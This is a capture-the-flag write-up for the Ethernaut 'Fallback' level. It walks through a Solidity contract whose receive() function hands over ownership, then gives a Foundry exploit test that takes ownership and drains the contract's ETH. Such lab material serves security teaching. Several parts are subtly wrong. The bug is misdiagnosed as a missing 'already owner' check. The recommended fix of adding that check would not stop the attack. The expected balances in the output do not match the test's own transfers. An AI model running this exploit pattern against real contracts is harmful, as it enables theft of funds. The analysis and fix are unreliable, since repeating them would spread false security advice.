# Ethernaut Level 1: Fallback

## Challenge Description
Claim ownership of the contract below to complete this level. Once you claim ownership, drain all the funds from the contract.

**Difficulty:** ⭐ (Beginner)

**Goal:**
1. Become the owner of the contract
2. Withdraw all ETH from the contract

## Vulnerable Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract Fallback {
    mapping(address => uint256) public contributions;
    address public owner;

    constructor() {
        owner = msg.sender;
        contributions[msg.sender] = 1000 * (1 ether);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function contribute() public payable {
        require(msg.value < 0.001 ether);
        contributions[msg.sender] += msg.value;
        if (contributions[msg.sender] > contributions[owner]) {
            owner = msg.sender;
        }
    }

    function getContribution() public view returns (uint256) {
        return contributions[msg.sender];
    }

    function withdraw() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {
        require(msg.value > 0 && contributions[msg.sender] > 0);
        owner = msg.sender;
    }
}
```

## Vulnerability Analysis

```text
The contract has TWO ways to become owner:

1. Through contribute():
   - You must send < 0.001 ETH
   - Your contribution must exceed the owner's contribution (1000 ETH)
   - IMPOSSIBLE: You'd need more than 1000 ETH!

2. Through receive() function:
   - Triggered when you send ETH directly to the contract
   - Requires: msg.value > 0 AND contributions[msg.sender] > 0
   - If both conditions met, you become owner!

THE BUG: The receive() function doesn't check if you're already the owner,
and it only requires a TINY contribution record to exist.
```

## Exploit Strategy

```text
Step 1: Call contribute() with a small amount (e.g., 0.0005 ETH)
   - This creates a contribution record for your address
   - contributions[you] = 0.0005 ETH (still less than owner's 1000 ETH)

Step 2: Send ETH directly to the contract
   - This triggers the receive() function
   - Conditions: msg.value > 0 ✓ and contributions[you] > 0 ✓
   - Result: owner = msg.sender (YOU!)

Step 3: Call withdraw()
   - Now you're the owner, so onlyOwner modifier passes
   - All ETH is transferred to you
```

## Exploit Contract (Foundry)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/Ethernaut/Fallback.sol";

contract FallbackExploitTest is Test {
    Fallback public target;
    address public attacker = address(0xBEEF);

    function setUp() public {
        target = new Fallback();
        vm.deal(attacker, 1 ether); // Fund attacker
    }

    function test_ExploitFallback() public {
        vm.startPrank(attacker);

        // Step 1: Create a contribution record
        target.contribute{value: 0.0005 ether}();
        console.log("Contribution made. Owner:", target.owner());

        // Step 2: Send ETH directly to trigger receive()
        (bool success, ) = address(target).call{value: 0.001 ether}("");
        require(success, "Direct ETH transfer failed");
        console.log("Direct ETH sent. New owner:", target.owner());

        // Step 3: Verify ownership changed
        assertEq(target.owner(), attacker, "Failed to become owner");

        // Step 4: Withdraw all funds
        uint256 balanceBefore = attacker.balance;
        target.withdraw();
        uint256 balanceAfter = attacker.balance;

        console.log("Balance before:", balanceBefore);
        console.log("Balance after:", balanceAfter);
        console.log("Profit:", balanceAfter - balanceBefore);

        // Step 5: Verify contract is drained
        assertEq(address(target).balance, 0, "Contract not drained");

        vm.stopPrank();

        console.log("\n✅ EXPLOIT SUCCESSFUL!");
    }
}
```

## Running the Exploit

```bash
# Run the test with verbose output
forge test --match-test test_ExploitFallback -vvv

# Expected output:
# [PASS] test_ExploitFallback() (gas: 123456)
# Logs:
#   Contribution made. Owner: 0x5B3...
#   Direct ETH sent. New owner: 0xBEEF...
#   Balance before: 999500000000000000
#   Balance after: 1000500000000000000
#   Profit: 1000000000000000
#
#   ✅ EXPLOIT SUCCESSFUL!
```

## How to Fix This Vulnerability

```solidity
// FIXED VERSION
receive() external payable {
    require(msg.value > 0, "Must send ETH");
    require(contributions[msg.sender] > 0, "No contribution record");
    require(msg.sender != owner, "Already owner"); // ADD THIS CHECK

    // Better: Don't allow ownership transfer via receive() at all
    // Or use a separate function with proper access control
}
```

## Key Takeaways
- **receive() Function:** Automatically called when ETH is sent directly to a contract (no function call).
- **Hidden Logic:** The receive() function had a hidden ownership transfer mechanism.
- **Always Audit Receive/Fallback:** These functions can contain critical logic that's easy to miss.
- **Defense in Depth:** Don't rely on a single condition (like contribution > 0) for critical operations.
- **Lesson Learned:** Always read ALL functions, including receive() and fallback(), during audits.